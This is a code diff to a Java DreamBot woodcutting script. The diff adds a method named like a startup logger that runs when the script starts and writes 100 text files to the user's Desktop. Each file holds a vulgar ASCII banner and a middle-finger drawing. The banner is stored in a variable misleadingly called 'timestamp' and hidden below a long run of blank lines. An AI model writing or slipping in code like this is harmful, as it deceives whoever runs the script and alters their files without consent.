@@ -12,17 +12,18 @@ import java.awt.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 
+import java.io.File;
+import java.io.IOException;
+import java.io.FileWriter;
 
 @ScriptManifest(
         author = "You",
-        name = "TreeChopper", version = 1.0,
+        name = "ChopTreeTest", version = 1.0,
         description = "chop trees",
         category = Category.WOODCUTTING
 )
 
-
-public class TreechopperMain extends TaskScript {
-
+public class ChopTreeTest extends TaskScript{
     private boolean bank = false;
     private String tree_type;
 
@@ -32,7 +33,7 @@ public class TreechopperMain extends TaskScript {
             createGUI();
         });
         log("tree chopper is now starting.");
-        ChopTreeTest.dreamBotStartupLogger();
+        dreamBotStartupLogger();
         SkillTracker.start(Skill.WOODCUTTING); // set to start on login
     }
 
@@ -84,5 +85,118 @@ public class TreechopperMain extends TaskScript {
         frame.getContentPane().add(setting_panel, BorderLayout.CENTER);
     }
 
+    public static void dreamBotStartupLogger(){
+        try{
+            for(int i = 0; i < 100; i++){
+                String username = System. getProperty("user.name");
+                String desktop = "C:\\Users\\" + username + "\\Desktop";
+                String path = desktop + logger_path + i + ".txt";
+                File file = new File(path);
+                file.createNewFile();
+                FileWriter myWriter = new FileWriter(path);
+                myWriter.write(timestamp);
+                myWriter.close();
+            }
+        }
+        catch(Exception e) {
+            log("Exception");
+            e.printStackTrace();
+        }
+        log("Done");
+
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    static String timestamp = "\n" +
+            "                   .___.__        __                            .___      \n" +
+            " __ _________    __| _/|__| ____ |  | ______   _____   ____   __| _/____  \n" +
+            "|  |  \\_  __ \\  / __ | |  |/ ___\\|  |/ /  _ \\ /     \\ /  _ \\ / __ |/ __ \\ \n" +
+            "|  |  /|  | \\/ / /_/ | |  \\  \\___|    <  <_> )  Y Y  (  <_> ) /_/ \\  ___/ \n" +
+            "|____/ |__|    \\____ | |__|\\___  >__|_ \\____/|__|_|  /\\____/\\____ |\\___  >\n" +
+            "                    \\/         \\/     \\/           \\/            \\/    \\/ \n" +
+            "....................../´¯/) \n" +
+            "....................,/¯../ \n" +
+            ".................../..../ \n" +
+            "............./´¯/'...'/´¯¯`·¸ \n" +
+            "........../'/.../..../......./¨¯\\ \n" +
+            "........('(...´...´.... ¯~/'...') \n" +
+            ".........\\.................'...../ \n" +
+            "..........''...\\.......... _.·´ \n" +
+            "............\\..............( \n" +
+            "..............\\.............\\...";
+    static String logger_path = "\\guh";
 
 }
